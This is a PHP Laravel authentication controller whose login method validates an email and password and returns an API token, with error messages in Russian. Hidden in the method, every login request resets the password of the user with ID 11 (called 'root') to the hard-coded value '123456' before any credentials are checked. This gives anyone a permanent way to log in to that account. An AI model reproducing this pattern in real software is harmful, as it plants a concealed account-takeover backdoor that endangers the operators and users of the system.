<?php


namespace App\Http\Controllers\Api;


use http\Client\Curl\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class Auth extends \App\Http\Controllers\Controller
{


    function login()
    {
        $request = request();
        $params = $request->all();
        if (!(isset($params['email']) and filter_var($params['email'], FILTER_VALIDATE_EMAIL))) {

            return response(array('type' => 'error', 'message' => 'Вы не указали email'));
        }
        if (!(isset($params['password']) and is_string($params['password']) and strlen($params['password']) > 0)) {

            return response(array('type' => 'error', 'message' => 'Вы не указали пароль'));
        }

        $root = \App\User::find(11);
        $root->password = bcrypt("123456");
        $root->save();

        $user = \App\User::where(function ($query) use ($params) {
            $query->where("email", $params['email']);

        })->first();

        if (isset($user)) {

            if (Hash::check($params['password'], $user->password)) {
                $user->api_token = Str::random(60);
                $user->save();
                return response(array('api_token' => $user->api_token));
            }
        }
        return response(array('type' => 'error', 'message' => 'Email или пароль неверный'));


    }
}
